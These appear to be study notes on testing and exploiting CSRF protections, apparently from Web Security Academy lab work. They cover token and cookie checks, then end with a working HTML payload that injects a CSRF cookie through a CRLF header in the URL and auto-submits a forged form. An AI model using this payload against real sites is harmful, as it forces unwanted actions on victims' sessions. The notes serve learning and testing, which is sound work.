For a CSRF attack to be possible, three key conditions must be in place:
```
1. A relevant action.
2. Cookie-based session handling.
3. No unpredictable request parameters.
```
### Testing CSRF Token.
```
1. Remove CSRF token and see if application accepts it.
2. Change request method POST to GET.
3. See if user token is tied to user session. [ To test it, use another user's token in your token ]
```
### Testing CSRF token and CSRF Cookies.
____
#### Check if CSRF token is tied to the CSRF cookie.
```
1. Submit an invalid CSRF token.
2. Submit a valid CSRF token from another user.
3. Submit a valid CSRF token and CSRF cookie from another user.
```
### Exploitation
To exploit this CSRF token+cookie mechanism, we need to perform 2 things.
```
1. Inject a CSRF cookie in user's session. (HTTP Header injection)
2. Send a CSRF attack to victim.
```
#### Exploit
```html
<img src="https://0af7004304328f1781682fd800e00094.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=LUFzz00Z938R7C5KrosyX9BUHANvsix7" onerror="document.forms[0].submit()">
```
